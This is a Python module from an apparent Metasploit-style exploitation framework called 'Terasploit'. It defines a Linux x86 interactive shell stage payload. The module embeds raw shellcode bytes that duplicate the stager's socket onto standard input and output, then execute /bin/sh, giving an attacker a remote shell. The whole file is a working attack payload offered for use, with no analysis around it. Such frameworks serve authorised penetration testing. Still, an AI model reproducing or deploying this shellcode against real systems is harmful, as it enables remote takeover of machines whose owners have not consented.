from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGE, Payload


class TerasploitModule(Payload):
    """Linux x86 interactive shell stage."""

    NAME: str = "Linux x86 Shell Stage"
    DESCRIPTION: str = (
        "Full interactive /bin/sh stage for Linux IA-32.  Delivered "
        "automatically over the channel opened by a compatible x86 stager. "
        "Not used directly by exploit modules."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = []
    PAYLOAD_TYPE: str = STAGE
    MAX_SIZE: int | None = 1024 * 1024  # 1 MiB
    ARCH: Sequence = [ARCH_X86]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    STAGE_BLOB = (
        b"\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58"
        b"\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
        b"\x89\xe1\xcd\x80"
    )

    def generate(self, ctx):
        """Generate method is not really implemented in stage payloads."""
        return b""

    def generate_stage(self, ctx):
        """
        Return the Linux x86 shell stage bytes.
        """
        return self.STAGE_BLOB
